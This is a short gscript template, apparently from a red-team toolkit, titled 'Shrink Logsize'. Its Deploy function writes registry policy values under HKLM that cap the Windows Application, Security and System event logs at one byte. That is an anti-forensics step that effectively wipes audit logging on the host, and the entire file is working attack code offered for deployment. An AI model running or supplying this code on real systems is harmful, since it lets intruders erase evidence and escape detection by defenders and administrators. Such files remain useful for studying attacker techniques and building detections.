// Example gscript template
// Title: Shrink Logsize
// Author: ahhh
// Purpose: This will shrink the max logsize of the windows event logs to a single byte
// Gscript version: 1.0.0
// ATT&CK: 

//priority:93
//timeout:150

//go_import:os as os
//go_import:github.com/gen0cide/gscript/x/windows as windows

function Deploy() {
    console.log("Starting execution of Shrink Logsize");

    var value = 0x00001
    // shrink the logs
    windows.AddRegKeyDWORD("LOCAL_MACHINE", "Software\\Policies\\Microsoft\\Windows\\EventLog\\Application", "MaxSize", value);
    windows.AddRegKeyDWORD("LOCAL_MACHINE", "Software\\Policies\\Microsoft\\Windows\\EventLog\\Security", "MaxSize", value);
    windows.AddRegKeyDWORD("LOCAL_MACHINE", "Software\\Policies\\Microsoft\\Windows\\EventLog\\System", "MaxSize", value);

    console.log("Done Shrink Logsize");
    return true;
  }
  